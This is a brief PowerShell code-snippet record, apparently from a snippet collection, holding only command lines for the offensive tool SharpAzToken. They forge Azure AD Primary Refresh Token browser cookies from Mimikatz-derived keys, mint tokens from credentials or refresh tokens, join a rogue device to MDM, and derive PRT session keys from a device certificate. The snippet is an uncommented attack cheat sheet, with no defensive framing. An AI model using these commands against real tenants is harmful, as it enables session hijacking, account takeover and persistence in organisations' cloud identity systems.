---
id: f18a972b-abc7-444e-99f9-9cfe9726fd69
type: code
language: Powershell
verified: false
created_at: '2023-05-24T07:19:04.496433+00:00'
updated_at: '2023-05-24T07:20:33.294550+00:00'
---

# Code Snippet f18a972b

**Language**: Powershell

```powershell
# Create a PRT-Cookie for the browser
SharpAzToken.exe cookie --derivedkey <Key from Mimikatz> --context <Context from Mimikatz> --prt <PRT from Mimikatz>

# Create a token
SharpAzToken.exe token --username <Username> --password <Password>

# Create a token from a refresh token
SharpAzToken.exe token --refreshtoken <RefreshToken>

# Join a deivce to MDM
SharpAzToken.exe mdm --joindevice --accesstoken (or some combination from the token part) --devicename <Name> --outpfxfile <Some path>

# Generate PRT and session key from a Device Certificate (device must be joined to MDM first)
SharpAzToken.exe devicekeys --pfxpath XXXX.pfx --refreshtoken (--prtcookie / ---username + --password )
```
